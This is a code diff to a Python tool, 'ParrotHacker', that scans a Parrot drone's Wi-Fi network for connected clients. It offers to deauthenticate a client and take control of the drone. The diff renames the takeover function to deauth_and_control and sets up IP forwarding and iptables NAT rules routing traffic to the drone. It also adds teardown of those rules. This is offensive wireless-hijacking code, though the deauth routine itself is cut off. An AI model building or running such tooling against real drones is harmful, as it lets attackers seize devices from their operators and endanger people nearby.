@@ -4,22 +4,12 @@
 #
 
 from multiprocessing import Process
+import time
 
 from .wifi import WifiManager, AccessPoint, Client
 from .ext_exec import do
 from .menu import Menu
 from . import disp
-
-
-
-# ===============
-#    Constants
-# ===============
-
-nodejs        = "node"
-controljs     = "app.js"
-controljs_dir = "ardrone-webflight"
-
 
 
 
@@ -93,7 +83,7 @@ class ParrotHacker:
             self.clients.append(client)
             self.menu.add_numbered_opt(
                     ("Disconnect client", client.ip, "then take control"),
-                    lambda: self.disconnect_and_control(client)
+                    lambda: self.deauth_and_control(client)
                 )
             disp.item1("Found client on", client)
 
@@ -118,7 +108,6 @@ class ParrotHacker:
             do("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
             disp.debug("IP forwarding enabled")
 
-            do("iptables -t nat -F")
             do("iptables -t nat -A PREROUTING -d 172.20.1.10",
                     "-j DNAT --to 192.168.1.1")
             do("iptables -t nat -A POSTROUTING -o", self.wlan.card.dev,
@@ -128,9 +117,24 @@ class ParrotHacker:
             disp.info("You can launch on 172.20.1.1 using:")
             disp.info("  export DEFAULT_DRONE_IP=172.20.1.10")
             disp.info("  node app.js")
+            disp.info("Press Ctrl+C when you are done")
+
+            try:
+                while True:
+                    time.sleep(100)
+            except KeyboardInterrupt:
+                pass
+
+            do("iptables -t nat -F")
+            disp.debug("NAT disabled")
+
+            do("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward")
+            disp.debug("IP forwarding disabled")
+
+            self.wlan.disconnect()
 
 
-    def disconnect_and_control(self, client):
+    def deauth_and_control(self, client):
         """ Disconnects a client then take control. """
         # Disconnect client
         disp.info("Disconnecting client", client, "from AP", self.ap)
